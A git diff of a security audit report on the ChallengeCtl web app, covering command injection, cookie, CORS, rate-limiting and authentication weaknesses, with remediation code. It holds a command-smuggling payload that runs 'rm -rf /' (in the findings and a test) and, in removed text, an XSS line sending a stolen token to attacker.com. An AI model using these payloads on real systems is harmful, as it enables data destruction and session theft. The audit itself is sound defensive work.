@@ -1,841 +1,669 @@
-# ChallengeCtl Security Analysis Report
+# ChallengeCtl Comprehensive Security Analysis Report
 
-**Date:** 2025-11-16
-**Scope:** API Authentication & User Login System
-**Analyst:** Security Review
+**Date:** 2025-11-17
+**Analyzed by:** Comprehensive Security Analysis
+**Scope:** Web UI, Authentication System, API, Backend, and Database
 
 ## Executive Summary
 
-This comprehensive security analysis of the ChallengeCtl API and authentication system has identified **23 security vulnerabilities and weaknesses** across critical, high, medium, and low severity categories. The system implements username/password authentication with TOTP-based 2FA, session-based authorization, and separate API key authentication for runners. While the foundation is solid with bcrypt password hashing and TOTP 2FA, there are significant gaps in brute force protection, session management, and defense-in-depth controls.
+This comprehensive security analysis identified **3 CRITICAL**, **4 HIGH**, and **7 MEDIUM** severity vulnerabilities across the ChallengeCtl web application, authentication system, and API. The most critical findings include command injection vulnerabilities, insecure cookie configuration, and missing input validation controls.
 
-**Risk Level: HIGH**
-
----
-
-## Table of Contents
-
-1. [Critical Vulnerabilities](#critical-vulnerabilities)
-2. [High Severity Issues](#high-severity-issues)
-3. [Medium Severity Issues](#medium-severity-issues)
-4. [Low Severity Issues](#low-severity-issues)
-5. [Security Strengths](#security-strengths)
-6. [Detailed Recommendations](#detailed-recommendations)
-7. [Implementation Priorities](#implementation-priorities)
+### Risk Summary
+- **Critical:** 3 issues requiring immediate attention
+- **High:** 4 issues requiring prompt remediation
+- **Medium:** 7 issues for scheduled remediation
+- **Low/Info:** 5 observations and best practices
 
 ---
 
-## Critical Vulnerabilities
+## Critical Vulnerabilities (Immediate Action Required)
 
-### 1. ⚠️ **No Rate Limiting on Authentication Endpoints**
+### 1. Command Injection in FT8 Challenge Module 🔴 CRITICAL
+**File:** `challenges/automate_ft8/run_response.py`
+**Lines:** 30, 38, 52, 58, 60, 65
 
-**Location:** `server/api.py:266-396`
+**Description:**
+Multiple instances of command injection vulnerabilities exist where user-controlled input is passed directly to `os.system()` without sanitization.
 
-**Issue:** The `/api/auth/login` and `/api/auth/verify-totp` endpoints have no rate limiting, allowing unlimited authentication attempts.
-
-**Impact:**
-- Brute force attacks on user passwords
-- TOTP code enumeration (000000-999999 = only 1 million combinations)
-- Account enumeration via timing differences
-- Denial of service via resource exhaustion
-
-**Evidence:**
+**Vulnerable Code Examples:**
 ```python
-@self.app.route('/api/auth/login', methods=['POST'])
-def login():
-    # No rate limiting decorator or logic
-    data = request.json
-    # ... authentication logic
+# Line 30
+os.system('python ft8_tx.py ' + tx_cycle)
+
+# Lines 52, 58, 60, 65
+os.system('./ft8encode "' + their_call + ' ' + my_call + ' ' + my_grid + '"')
+os.system('./ft8encode "' + their_call + ' ' + my_call + ' R+' + str(snr).zfill(2) + '"')
 ```
 
-**Exploitation Scenario:**
-1. Attacker scripts automated login attempts
-2. Tests common passwords against known usernames
-3. If TOTP is required, can attempt all 1 million codes within the 30-second window
-4. No lockout or throttling prevents this attack
+**Attack Vector:**
+An attacker could inject shell commands through `their_call`, `my_call`, or `my_grid` parameters:
+```
+their_call = 'TEST"; rm -rf / #'
+```
+
+**Exploitation Impact:**
+- Remote Code Execution (RCE)
+- Complete system compromise
+- Data exfiltration
+- Lateral movement to other systems
 
 **Recommendation:**
-- Implement rate limiting: 5 failed attempts per IP per 15 minutes
-- Add account lockout after 10 failed attempts in 1 hour
-- Implement exponential backoff (increase delay after each failure)
-- Consider CAPTCHA after 3 failed attempts
-
----
-
-### 2. ⚠️ **Session Tokens Not Invalidated on Critical Actions**
-
-**Location:** `server/api.py:409-456` (password change), `server/api.py:605-646` (admin password reset)
-
-**Issue:** When a user changes their password or an admin resets a password, existing sessions remain valid. This violates the principle of least privilege.
-
-**Impact:**
-- Compromised sessions remain valid after password change
-- Attacker maintains access even after password reset
-- No forced re-authentication after security-critical actions
-
-**Evidence:**
 ```python
-@self.app.route('/api/auth/change-password', methods=['POST'])
-@self.require_admin_auth
-def change_own_password():
-    # ... password change logic
-    if not self.db.change_password(username, new_password_hash):
-        return jsonify({'error': 'Failed to update password'}), 500
+# Replace os.system() with subprocess.run() using argument lists
+import subprocess
+import shlex
 
-    # ❌ No session invalidation!
-    return jsonify({'status': 'password changed'}), 200
+# GOOD - Prevents command injection
+subprocess.run(['./ft8encode', f'{their_call} {my_call} {my_grid}', '1000', '0', '0', '0', '0', '1', '47'])
+
+# Or validate input strictly
+import re
+def validate_callsign(call):
+    if not re.match(r'^[A-Z0-9]{3,6}$', call):
+        raise ValueError("Invalid callsign")
+    return call
 ```
-
-**Recommendation:**
-- Invalidate all sessions except the current one on password change
-- Force logout on admin-initiated password reset
-- Implement a session version/generation number that increments on security changes
 
 ---
 
-### 3. ⚠️ **CORS Configured to Allow All Origins**
+### 2. Insecure Cookie Configuration (Session Hijacking Risk) 🔴 CRITICAL
+**File:** `server/api.py`
+**Lines:** 513, 569, 738
 
-**Location:** `server/api.py:76-77`
+**Description:**
+Session and CSRF cookies are configured with `SameSite=None` and `Secure=False`, making them vulnerable to CSRF and session hijacking attacks.
 
-**Issue:** CORS is configured with wildcard `*` origin, allowing any website to make authenticated requests to the API.
-
-**Impact:**
-- Cross-site request forgery (CSRF) attacks possible
-- Malicious websites can make API calls on behalf of authenticated users
-- Session tokens can be extracted by malicious sites
-
-**Evidence:**
+**Vulnerable Code:**
 ```python
-# Enable CORS for development
-CORS(self.app)  # ❌ Allows all origins by default
-
-# WebSocket CORS
-self.socketio = SocketIO(self.app, cors_allowed_origins="*")  # ❌ Wildcard
+# Lines 513, 569
+response.set_cookie(
+    'session_token',
+    session_token,
+    httponly=True,
+    secure=False,      # ❌ Should be True in production
+    samesite=None,     # ❌ Too permissive - allows CSRF
+    max_age=86400
+)
 ```
 
+**Attack Vector:**
+1. **CSRF:** Attacker can trigger authenticated requests from victim's browser
+2. **Session Hijacking:** Session tokens transmitted over HTTP can be intercepted
+3. **Cross-site attacks:** Cookies sent to all cross-origin requests
+
 **Recommendation:**
-- Configure explicit allowed origins: `CORS(app, origins=['https://challengectl.example.com'])`
-- Remove wildcard CORS in production
-- Implement proper CSRF tokens for state-changing operations
-
----
-
-### 4. ⚠️ **Timing Attack Vulnerability in Password Verification**
-
-**Location:** `server/api.py:289-296`
-
-**Issue:** Error messages and response times differ between "user not found" and "invalid password", enabling username enumeration.
-
-**Impact:**
-- Attackers can enumerate valid usernames
-- Reduces brute force search space from username+password to just password
-- Violates security best practice of constant-time comparisons
-
-**Evidence:**
 ```python
-user = self.db.get_user(username)
-if not user:
-    return jsonify({'error': 'Invalid credentials'}), 401  # ⏱️ Fast response
+# Detect if running on HTTPS
+is_secure = request.is_secure or request.headers.get('X-Forwarded-Proto') == 'https'
 
-# Verify password
-if not bcrypt.checkpw(password.encode('utf-8'), password_hash.encode('utf-8')):
-    return jsonify({'error': 'Invalid credentials'}), 401  # ⏱️ Slower (bcrypt)
+response.set_cookie(
+    'session_token',
+    session_token,
+    httponly=True,
+    secure=is_secure,        # ✅ True in production
+    samesite='Strict',       # ✅ Prevent CSRF (or 'Lax' if needed)
+    max_age=86400
+)
 ```
-
-**Exploitation:**
-```bash
-# Fast response (user doesn't exist)
-time: 5ms -> user "alice" does not exist
-
-# Slow response (user exists, wrong password)
-time: 250ms -> user "bob" exists (bcrypt hashing delay)
-```
-
-**Recommendation:**
-- Always call bcrypt.checkpw() even for non-existent users with a dummy hash
-- Ensure constant response time for all authentication failures
-- Use generic error messages
 
 ---
 
-### 5. ⚠️ **In-Memory Session Storage (No Persistence)**
+### 3. WebSocket CORS Configuration Too Permissive 🔴 CRITICAL
+**File:** `server/api.py`
+**Line:** 117
 
-**Location:** `server/api.py:99-102`
+**Description:**
+WebSocket connections accept connections from any origin (`cors_allowed_origins="*"`), bypassing CORS protection.
 
-**Issue:** Sessions are stored in memory only, causing all users to be logged out on server restart. Not suitable for production.
-
-**Impact:**
-- All sessions lost on server restart/crash
-- No horizontal scaling possible (load balancing won't work)
-- Session fixation risk (sessions never truly expire on disk)
-- No audit trail of active sessions
-
-**Evidence:**
+**Vulnerable Code:**
 ```python
-# In-memory sessions with thread-safe locking
-# Format: {session_token: {'username': str, 'expires': datetime, 'totp_verified': bool}}
-self.sessions = {}  # ❌ Lost on restart
-self.sessions_lock = threading.Lock()
+# Line 117
+self.socketio = SocketIO(self.app, cors_allowed_origins="*")
+```
+
+**Attack Vector:**
+- Malicious website can establish WebSocket connection to server
+- Can send commands or receive sensitive data
+- Bypasses Same-Origin Policy
+
+**Recommendation:**
+```python
+# Use the same CORS origins as the REST API
+self.socketio = SocketIO(
+    self.app,
+    cors_allowed_origins=allowed_origins,  # Same as REST API
+    cookie='session_token'  # Tie to session cookie
+)
+```
+
+---
+
+## High Severity Vulnerabilities
+
+### 4. Missing File Upload Restrictions 🟠 HIGH
+**File:** `server/api.py`
+**Lines:** 1575-1617
+
+**Description:**
+File upload endpoint lacks size limits, type validation, and malware scanning.
+
+**Vulnerable Code:**
+```python
+@self.app.route('/api/files/upload', methods=['POST'])
+@self.require_api_key
+def upload_file():
+    file_data = file.read()  # ❌ No size limit
+    # ❌ No file type validation
+    # ❌ No malware scanning
+```
+
+**Attack Vector:**
+1. **Resource exhaustion:** Upload massive files to consume disk space
+2. **Malicious file storage:** Upload malware that could be executed later
+3. **ZIP bombs:** Compressed files that expand to enormous size
+
+**Recommendation:**
+```python
+MAX_FILE_SIZE = 100 * 1024 * 1024  # 100 MB
+ALLOWED_EXTENSIONS = {'.wav', '.bin', '.txt', '.yml', '.yaml'}
+
+def upload_file():
+    file = request.files['file']
+
+    # Validate file size
+    file.seek(0, os.SEEK_END)
+    file_size = file.tell()
+    file.seek(0)
+
+    if file_size > MAX_FILE_SIZE:
+        return jsonify({'error': 'File too large'}), 413
+
+    # Validate file extension
+    ext = os.path.splitext(file.filename)[1].lower()
+    if ext not in ALLOWED_EXTENSIONS:
+        return jsonify({'error': 'Invalid file type'}), 400
+
+    # Read and process file...
+```
+
+---
+
+### 5. Missing Rate Limiting on Most Endpoints 🟠 HIGH
+**File:** `server/api.py`
+**Lines:** 119-128
+
+**Description:**
+Rate limiting is only applied to `/auth/login` and `/auth/verify-totp`. Other endpoints are vulnerable to abuse.
+
+**Current Configuration:**
+```python
+# Only these endpoints are rate-limited:
+@self.limiter.limit("5 per 15 minutes")
+def login(): ...
+
+@self.limiter.limit("5 per 15 minutes")
+def verify_totp(): ...
+
+# Everything else: NO RATE LIMITING
+```
+
+**Attack Vector:**
+1. **API abuse:** Unlimited requests to `/api/challenges`, `/api/runners`, etc.
+2. **DoS:** Exhaust server resources with rapid requests
+3. **Data scraping:** Extract all data without restrictions
+4. **WebSocket flooding:** Spam WebSocket connections
+
+**Recommendation:**
+```python
+# Add default rate limits
+self.limiter = Limiter(
+    app=self.app,
+    key_func=get_remote_address,
+    default_limits=["100 per minute", "1000 per hour"],  # ✅ Default limits
+    storage_uri="memory://",
+    strategy="fixed-window"
+)
+
+# Stricter limits for sensitive endpoints
+@self.limiter.limit("5 per 15 minutes")  # Login
+@self.limiter.limit("10 per minute")     # API reads
+@self.limiter.limit("5 per minute")      # API writes
+```
+
+---
+
+### 6. SQL Injection Risk from Dynamic Query Construction 🟠 HIGH
+**File:** `server/server.py`
+**Lines:** 153-157
+
+**Description:**
+While most queries use parameterization correctly, there's a dynamic SQL construction in the startup routine that could be risky if modified.
+
+**Vulnerable Pattern:**
+```python
+# Line 153-157
+cursor.execute('''
+    SELECT challenge_id FROM challenges
+    WHERE status IN ('assigned', 'waiting')
+      AND enabled = 1
+''')
+```
+
+**Current Status:** ✅ Currently safe (hardcoded values)
+
+**Risk:** If someone modifies this to use variables without parameterization:
+```python
+# ❌ DANGEROUS - Don't do this
+status_filter = request.args.get('status')
+cursor.execute(f"SELECT * FROM challenges WHERE status = '{status_filter}'")
 ```
 
 **Recommendation:**
-- Migrate to Redis or database-backed sessions
-- Implement session persistence
-- Add session metadata: IP address, user agent, created_at, last_activity
-- Enable session revocation and audit logging
+1. Add code review guidelines prohibiting string interpolation in SQL
+2. Use an ORM like SQLAlchemy for type safety
+3. Add static analysis tools (e.g., Bandit) to CI/CD
 
 ---
 
-## High Severity Issues
+### 7. Weak Default Password Entropy (Initial Setup) 🟠 HIGH
+**File:** `server/database.py`
+**Lines:** 170-183
 
-### 6. 🔴 **No Account Lockout Mechanism**
+**Description:**
+Default admin password uses `secrets.choice()` correctly, but the character set could be stronger.
 
-**Location:** `server/api.py:266-330`
-
-**Issue:** Failed login attempts are not tracked, no temporary account lockout implemented.
-
-**Impact:**
-- Unlimited password guessing attempts
-- No protection against persistent brute force
-- Account compromise via automated attacks
+**Current Code:**
+```python
+# Line 176-177
+alphabet = string.ascii_letters + string.digits  # ❌ No special characters
+default_password = ''.join(secrets.choice(alphabet) for _ in range(16))
+```
 
 **Recommendation:**
-- Track failed attempts per username in database
-- Lock account for 30 minutes after 10 failed attempts
-- Send email notification on account lockout
-- Require CAPTCHA or admin unlock for locked accounts
+```python
+# ✅ Include special characters for stronger passwords
+import string
+import secrets
+
+alphabet = string.ascii_letters + string.digits + string.punctuation
+default_password = ''.join(secrets.choice(alphabet) for _ in range(20))
+```
 
 ---
 
-### 7. 🔴 **Session Tokens Stored in localStorage (XSS Risk)**
+## Medium Severity Vulnerabilities
 
-**Location:** `frontend/src/auth.js:5-14`
+### 8. Information Disclosure in Error Messages 🟡 MEDIUM
+**File:** `server/api.py`
+**Lines:** Various
 
-**Issue:** Session tokens stored in localStorage are vulnerable to XSS attacks. Any JavaScript execution can steal tokens.
+**Description:**
+Error messages may leak sensitive information about system internals.
 
-**Impact:**
-- XSS vulnerability leads to complete session hijacking
-- Tokens persist across browser restarts (can't be cleared easily)
-- No HttpOnly protection (accessible to JavaScript)
+**Example:**
+```python
+# Line 1616
+except Exception as e:
+    logger.error(f"Error uploading file: {e}")
+    return jsonify({'error': str(e)}), 500  # ❌ Leaks exception details
+```
 
-**Evidence:**
-```javascript
-const apiKey = ref(localStorage.getItem('apiKey') || null)
+**Recommendation:**
+```python
+except Exception as e:
+    logger.error(f"Error uploading file: {e}")
+    return jsonify({'error': 'Internal server error'}), 500  # ✅ Generic message
+```
 
-export function login(key) {
-  apiKey.value = key
-  localStorage.setItem('apiKey', key)  // ❌ XSS vulnerable
+---
+
+### 9. Missing Security Headers 🟡 MEDIUM
+**Description:**
+The application doesn't set important security headers.
+
+**Missing Headers:**
+- `X-Content-Type-Options: nosniff`
+- `X-Frame-Options: DENY`
+- `Strict-Transport-Security: max-age=31536000`
+- `Content-Security-Policy`
+- `Permissions-Policy`
+
+**Recommendation:**
+```python
+# Add to Flask app initialization
+from flask_talisman import Talisman
+
+# Configure security headers
+csp = {
+    'default-src': "'self'",
+    'script-src': "'self' 'unsafe-inline'",  # Vue.js may need unsafe-inline
+    'style-src': "'self' 'unsafe-inline'",
+    'img-src': "'self' data:",
+    'connect-src': "'self' ws: wss:"
 }
-```
 
-**Attack Scenario:**
-```javascript
-// If attacker injects this via XSS:
-fetch('https://attacker.com/steal?token=' + localStorage.getItem('apiKey'))
+Talisman(
+    self.app,
+    force_https=True,
+    strict_transport_security=True,
+    content_security_policy=csp,
+    x_content_type_options=True,
+    x_frame_options='DENY'
+)
 ```
-
-**Recommendation:**
-- Use HttpOnly cookies instead of localStorage
-- Implement proper CSRF protection with cookies
-- Add Content-Security-Policy headers to prevent XSS
-- Consider using BFF (Backend-for-Frontend) pattern
 
 ---
 
-### 8. 🔴 **No CSRF Protection on State-Changing Endpoints**
+### 10. Insufficient Session Timeout Validation 🟡 MEDIUM
+**File:** `server/api.py`
+**Lines:** 697-701
 
-**Location:** All POST/PUT/DELETE endpoints in `server/api.py`
-
-**Issue:** No CSRF tokens required for state-changing operations. Combined with CORS misconfiguration, this is dangerous.
-
-**Impact:**
-- Attackers can craft malicious websites that perform actions as authenticated users
-- Can trigger password changes, user creation, challenge modifications
-- Session hijacking via cross-site requests
+**Description:**
+Session expiry checks use local system time, which can be manipulated in certain scenarios.
 
 **Recommendation:**
-- Implement CSRF token validation for all POST/PUT/DELETE requests
-- Use Double Submit Cookie or Synchronizer Token pattern
-- Validate Origin/Referer headers
-- Consider SameSite cookie attribute
+- Use UTC timestamps consistently
+- Add server-side session timeout enforcement
+- Implement sliding session expiration
 
 ---
 
-### 9. 🔴 **Static API Keys with No Rotation**
+### 11. Missing Input Validation on Challenge Config 🟡 MEDIUM
+**File:** `server/api.py`
+**Lines:** 1385-1409
 
-**Location:** `server/api.py:88`, runner authentication
-
-**Issue:** Runner API keys are static, stored in config file, never rotated, and have no expiration.
-
-**Impact:**
-- Compromised API key grants permanent access
-- No way to detect or revoke compromised keys
-- Keys stored in plain text in config file
-- No audit trail of API key usage
-
-**Evidence:**
-```python
-self.api_keys = self.config.get('server', {}).get('api_keys', {})
-
-# API keys never expire, never rotate
-def require_api_key(self, f):
-    for rid, key in self.api_keys.items():
-        if key == api_key:  # ❌ Static comparison
-            runner_id = rid
-            break
-```
-
-**Recommendation:**
-- Implement API key rotation (e.g., 90-day expiration)
-- Store hashed API keys in database, not plain text
-- Add key generation timestamp and last-used tracking
-- Implement key revocation capability
-- Consider using short-lived JWT tokens instead
-
----
-
-### 10. 🔴 **Default Admin Account During Initial Setup**
-
-**Location:** `server/database.py:144-188`
-
-**Issue:** Default admin account created with random password displayed in logs. If logs are exposed or retained, this is a security risk.
-
-**Impact:**
-- Default credentials may be captured in log aggregation systems
-- Password visible in terminal scrollback
-- If initial setup not completed, default account remains active
-- No forced password change on first login
-
-**Evidence:**
-```python
-logger.warning(f"Password: {default_password}")  # ❌ Logged in plain text
-print(f"Password: {default_password}", flush=True)  # ❌ Displayed in terminal
-```
-
-**Recommendation:**
-- Never log passwords, even temporary ones
-- Display password only once in terminal with clear warning
-- Force immediate password change on first login
-- Auto-disable default account after timeout (24 hours)
-- Send password via secure out-of-band channel
-
----
-
-### 11. 🔴 **No Session Activity Timeout**
-
-**Location:** `server/api.py:213-225`
-
-**Issue:** Sessions expire after 24 hours from creation, but not based on last activity. Inactive sessions remain valid.
-
-**Impact:**
-- Compromised session remains valid even if user is inactive
-- No protection against session theft
-- Violates principle of least privilege
-
-**Evidence:**
-```python
-def create_session(self, username: str, totp_verified: bool = False) -> str:
-    session_token = secrets.token_urlsafe(32)
-    expires = datetime.now() + timedelta(hours=24)  # ❌ No activity-based timeout
-```
-
-**Recommendation:**
-- Implement sliding session timeout (15 minutes of inactivity)
-- Update `last_activity` timestamp on each authenticated request
-- Invalidate sessions after 15 minutes of inactivity
-- Keep maximum session lifetime at 24 hours
-
----
-
-### 12. 🔴 **No WebSocket Authentication Validation**
-
-**Location:** `server/api.py:1238-1254`
-
-**Issue:** WebSocket connections are established without explicit authentication validation in the connect handler.
-
-**Impact:**
-- Unauthenticated users might receive real-time updates
-- Potential information disclosure
-- WebSocket connection hijacking
-
-**Evidence:**
-```python
-@self.socketio.on('connect')
-def handle_connect():
-    logger.info(f"WebSocket client connected: {request.sid}")
-    # ❌ No authentication check!
-    stats = self.db.get_dashboard_stats()
-    emit('initial_state', {...})
-```
-
-**Recommendation:**
-- Validate session token on WebSocket connect
-- Disconnect unauthenticated clients
-- Implement room-based access control
-- Add authentication to all WebSocket event handlers
-
----
-
-## Medium Severity Issues
-
-### 13. 🟡 **Weak Password Policy**
-
-**Location:** `server/api.py:424-425`, `server/api.py:481-482`
-
-**Issue:** Password requirements are minimal (8 characters only, no complexity requirements).
-
-**Impact:**
-- Users can set weak passwords like "password" or "12345678"
-- Increased vulnerability to dictionary attacks
-- Lower security posture
+**Description:**
+Challenge configuration updates accept arbitrary JSON without schema validation.
 
 **Recommendation:**
 ```python
-def validate_password(password: str) -> tuple[bool, str]:
+import jsonschema
+
+CHALLENGE_SCHEMA = {
+    "type": "object",
+    "properties": {
+        "name": {"type": "string", "maxLength": 100},
+        "frequency": {"type": "integer", "minimum": 0},
+        "modulation": {"type": "string", "enum": ["nbfm", "cw", "ssb", ...]},
+        # ... more fields
+    },
+    "required": ["name", "frequency", "modulation"]
+}
+
+def update_challenge(challenge_id):
+    config = data.get('config')
+
+    # Validate against schema
+    try:
+        jsonschema.validate(config, CHALLENGE_SCHEMA)
+    except jsonschema.ValidationError as e:
+        return jsonify({'error': f'Invalid config: {e.message}'}), 400
+```
+
+---
+
+### 12. TOTP Window Too Large 🟡 MEDIUM
+**File:** `server/api.py`
+**Line:** 637
+
+**Description:**
+TOTP validation uses `valid_window=1`, accepting codes from ±30 seconds (90-second total window).
+
+**Current Code:**
+```python
+# Line 637
+if not totp.verify(totp_code, valid_window=1):  # ±1 period = ±30s
+```
+
+**Recommendation:**
+```python
+# Use valid_window=0 for strict validation (30-second window only)
+if not totp.verify(totp_code, valid_window=0):
+    return jsonify({'error': 'Invalid TOTP code'}), 401
+```
+
+**Note:** This may affect user experience if clocks are slightly out of sync.
+
+---
+
+### 13. No Account Lockout Mechanism 🟡 MEDIUM
+**Description:**
+While rate limiting exists, there's no permanent account lockout after repeated failed attempts.
+
+**Recommendation:**
+```python
+# Add failed login tracking
+def login():
+    user = self.db.get_user(username)
+
+    # Check if account is locked
+    if user and user.get('locked_until'):
+        if datetime.now() < datetime.fromisoformat(user['locked_until']):
+            return jsonify({'error': 'Account temporarily locked'}), 403
+
+    # Track failed attempts
+    if not password_valid:
+        failed_attempts = user.get('failed_login_attempts', 0) + 1
+        self.db.increment_failed_attempts(username, failed_attempts)
+
+        # Lock account after 5 failed attempts
+        if failed_attempts >= 5:
+            lock_until = datetime.now() + timedelta(minutes=30)
+            self.db.lock_account(username, lock_until)
+            return jsonify({'error': 'Account locked due to repeated failures'}), 403
+```
+
+---
+
+### 14. Encryption Key Management 🟡 MEDIUM
+**File:** `server/crypto.py`
+**Lines:** 40-63
+
+**Description:**
+Encryption key is stored in a file without external key management system.
+
+**Current Implementation:**
+```python
+# Key stored in server/.encryption_key with 600 permissions
+# ⚠️ Single point of failure
+# ⚠️ Not backed up securely
+# ⚠️ No key rotation mechanism
+```
+
+**Recommendation:**
+1. Use environment variable or secrets manager (AWS KMS, HashiCorp Vault, etc.)
+2. Implement key rotation mechanism
+3. Consider using different keys for different purposes (data encryption, TOTP, etc.)
+
+---
+
+## Low Severity / Informational Findings
+
+### 15. CORS Configuration Complexity ℹ️ INFO
+**File:** `server/api.py`
+**Lines:** 85-114
+
+**Observation:**
+CORS configuration has multiple fallbacks (config file → env var → localhost defaults), which could lead to misconfigurations.
+
+**Recommendation:**
+Document CORS configuration clearly and validate on startup.
+
+---
+
+### 16. Verbose Logging May Leak Sensitive Data ℹ️ INFO
+**Examples:**
+```python
+# Line 484 - Logs failed login reason
+logger.warning(f"... reason={reason} ...")  # Could help attackers
+
+# Line 641 - Logs partial TOTP code
+logger.warning(f"... code={totp_code[:2]}** ...")
+```
+
+**Recommendation:**
+Review logs for sensitive data leakage before production deployment.
+
+---
+
+### 17. WebSocket Authentication Bypass for Public Namespace ℹ️ INFO
+**File:** `server/api.py`
+**Lines:** 1702-1719
+
+**Observation:**
+Public WebSocket namespace (`/public`) has no authentication, which is by design but should be documented.
+
+**Status:** ✅ Acceptable for public dashboard
+
+---
+
+### 18. Password Complexity Not Enforced ℹ️ INFO
+**File:** `server/api.py`
+**Lines:** 768, 832
+
+**Description:**
+Only minimum length (8 characters) is enforced. No complexity requirements.
+
+**Current Code:**
+```python
+if len(new_password) < 8:
+    return jsonify({'error': 'Password must be at least 8 characters'}), 400
+```
+
+**Recommendation:**
+```python
+def validate_password_strength(password):
     if len(password) < 12:
         return False, "Password must be at least 12 characters"
     if not re.search(r'[A-Z]', password):
-        return False, "Password must contain uppercase letter"
+        return False, "Password must contain uppercase letters"
     if not re.search(r'[a-z]', password):
-        return False, "Password must contain lowercase letter"
-    if not re.search(r'[0-9]', password):
-        return False, "Password must contain number"
-    if not re.search(r'[^A-Za-z0-9]', password):
-        return False, "Password must contain special character"
-    return True, "Password valid"
+        return False, "Password must contain lowercase letters"
+    if not re.search(r'\d', password):
+        return False, "Password must contain numbers"
+    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
+        return False, "Password must contain special characters"
+    return True, ""
 ```
 
 ---
 
-### 14. 🟡 **TOTP Valid Window of 1 (Replay Window)**
+### 19. No Content Security Policy on Frontend ℹ️ INFO
+**File:** `frontend/index.html`
 
-**Location:** `server/api.py:373`
+**Observation:**
+HTML doesn't include CSP meta tags.
 
-**Issue:** TOTP verification uses `valid_window=1`, allowing codes from previous and next 30-second windows.
+**Recommendation:**
+```html
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
+```
 
-**Impact:**
-- 90-second window for code validity (extends attack time)
-- Potential for replay attacks if code is intercepted
-- Reduces TOTP security effectiveness
+---
 
-**Evidence:**
+## Positive Security Findings ✅
+
+The following security controls are **correctly implemented**:
+
+1. ✅ **SQL Injection Protection:** All database queries use parameterized statements (database.py:57-947)
+2. ✅ **XSS Protection:** Vue.js templates auto-escape output (no `v-html` usage found)
+3. ✅ **Password Hashing:** bcrypt with proper salt (api.py:471, 782, 838)
+4. ✅ **TOTP 2FA:** pyotp implementation with replay protection (api.py:627-652)
+5. ✅ **Session Management:** httpOnly cookies prevent XSS token theft (api.py:509, 565)
+6. ✅ **CSRF Protection:** Double-submit cookie pattern correctly implemented (api.py:278-302)
+7. ✅ **Timing Attack Prevention:** Constant-time password comparison with dummy hash (api.py:460-475)
+8. ✅ **TOTP Secret Encryption:** Fernet encryption for TOTP secrets at rest (crypto.py:65-105)
+9. ✅ **Authentication Guards:** Vue Router properly guards protected routes (router.js:79-116)
+10. ✅ **Path Traversal Prevention:** File downloads use hash-based lookup (api.py:1559-1573)
+
+---
+
+## Remediation Priority
+
+### Immediate (This Week)
+1. **Fix command injection** in FT8 challenge module (CRITICAL)
+2. **Update cookie configuration** to use `SameSite=Strict` and `Secure=True` (CRITICAL)
+3. **Fix WebSocket CORS** to use same origin list as REST API (CRITICAL)
+
+### Short-term (This Month)
+4. Add file upload restrictions (size, type, scanning)
+5. Implement comprehensive rate limiting
+6. Add security headers (Talisman or custom middleware)
+7. Review and sanitize error messages
+
+### Medium-term (Next Quarter)
+8. Implement account lockout mechanism
+9. Add input validation schemas for all endpoints
+10. Migrate to external key management system
+11. Add password complexity requirements
+12. Implement security monitoring and alerting
+
+---
+
+## Testing Recommendations
+
+### Security Testing to Perform:
+1. **Penetration Testing:** Hire external firm to test for vulnerabilities
+2. **Static Analysis:** Run Bandit, Semgrep, or similar tools in CI/CD
+3. **Dynamic Analysis:** Use OWASP ZAP or Burp Suite for automated scanning
+4. **Dependency Scanning:** Monitor for vulnerable dependencies (Dependabot, Snyk)
+5. **Code Review:** Implement security-focused code review process
+
+### Test Cases to Add:
 ```python
-totp = pyotp.TOTP(totp_secret)
-if not totp.verify(totp_code, valid_window=1):  # ⚠️ 90-second window
-```
+# Test command injection prevention
+def test_no_command_injection():
+    malicious_call = "TEST\"; rm -rf / #"
+    with pytest.raises(ValueError):
+        answer_cq(malicious_call, "MYCALL", "GRID")
 
-**Recommendation:**
-- Reduce to `valid_window=0` for strict 30-second enforcement
-- Store used TOTP codes in cache to prevent replay
-- Implement TOTP code single-use enforcement
-- Consider requiring fresh code on critical actions
+# Test session hijacking prevention
+def test_secure_cookies():
+    response = client.post('/api/auth/login', json={...})
+    assert 'Secure' in response.headers['Set-Cookie']
+    assert 'SameSite=Strict' in response.headers['Set-Cookie']
 
----
-
-### 15. 🟡 **No Logging of Authentication Failures**
-
-**Location:** `server/api.py:266-396`
-
-**Issue:** Failed login attempts are not logged or tracked for security monitoring.
-
-**Impact:**
-- No visibility into brute force attacks
-- Cannot detect compromised accounts
-- No audit trail for security incidents
-- Impossible to perform forensic analysis
-
-**Recommendation:**
-```python
-def log_auth_failure(username, ip_address, reason, totp_attempt=False):
-    logger.warning(
-        f"Authentication failure: username={username}, "
-        f"ip={ip_address}, reason={reason}, totp={totp_attempt}"
-    )
-    # Store in database for analysis
-    db.log_auth_event(
-        event_type='auth_failure',
-        username=username,
-        ip_address=ip_address,
-        reason=reason,
-        timestamp=datetime.now()
-    )
+# Test file upload size limit
+def test_file_upload_size_limit():
+    large_file = b'A' * (101 * 1024 * 1024)  # 101 MB
+    response = client.post('/api/files/upload', data={'file': large_file})
+    assert response.status_code == 413
 ```
 
 ---
 
-### 16. 🟡 **Frontend Route Guards Only Check Token Presence**
-
-**Location:** `frontend/src/router.js:78-90`
-
-**Issue:** Router navigation guards only check if a token exists in localStorage, not if it's valid.
-
-**Impact:**
-- Expired or invalid tokens allow access to protected routes
-- UI shows protected pages before API rejects requests
-- Poor user experience and potential information disclosure
-
-**Evidence:**
-```javascript
-router.beforeEach((to, from, next) => {
-  const requiresAuth = to.matched.some(record => record.meta.requiresAuth)
-
-  if (requiresAuth && !checkAuth()) {  // ❌ Only checks token existence
-    next('/login')
-  } else {
-    next()  // ❌ Doesn't validate token with backend
-  }
-})
-```
-
-**Recommendation:**
-- Validate token with backend before allowing access
-- Implement token refresh mechanism
-- Add token expiration tracking in frontend
-- Redirect to login on 401 responses (already implemented in api.js)
-
----
-
-### 17. 🟡 **No IP-Based Anomaly Detection**
-
-**Issue:** No tracking of login patterns, IP addresses, or geographic locations.
-
-**Impact:**
-- Cannot detect account takeover from unusual locations
-- No alert on suspicious login patterns
-- No protection against distributed brute force attacks
-
-**Recommendation:**
-- Store IP address and user agent with each session
-- Alert users on login from new IP/location
-- Implement geolocation-based risk scoring
-- Track failed attempts per IP across all accounts
-
----
-
-### 18. 🟡 **Missing Content Security Policy (CSP)**
-
-**Location:** Nginx configuration and Flask responses
-
-**Issue:** No Content-Security-Policy headers implemented to prevent XSS.
-
-**Impact:**
-- Higher risk of XSS exploitation
